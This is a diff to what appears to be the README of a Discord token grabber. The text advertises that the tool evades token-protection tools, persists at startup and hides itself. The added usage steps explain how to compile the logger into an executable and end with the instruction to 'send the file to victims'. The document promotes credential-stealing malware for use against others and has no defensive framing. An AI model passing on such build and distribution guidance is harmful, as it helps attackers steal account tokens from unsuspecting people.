@@ -28,3 +28,14 @@ No, this token grabber does not bypass antivirus, the paid version does, join th
 Yes, this token grabber bypasses token protector and betterdiscord.
 
 Yes, this token grabber attempts to add itself so it's run on computer startup, and hides itself after the program is run.
+
+# Usage
+
+1. Download the repository as a zip
+2. Extract the contents of the zip file into a seperate folder
+3. Run setup.bat
+4. Enter a name for your token logger
+5. Open the dist folder to find your compiled exe file
+6. Send the file to victims
+
+Make sure you have [python](https://python.org) installed!
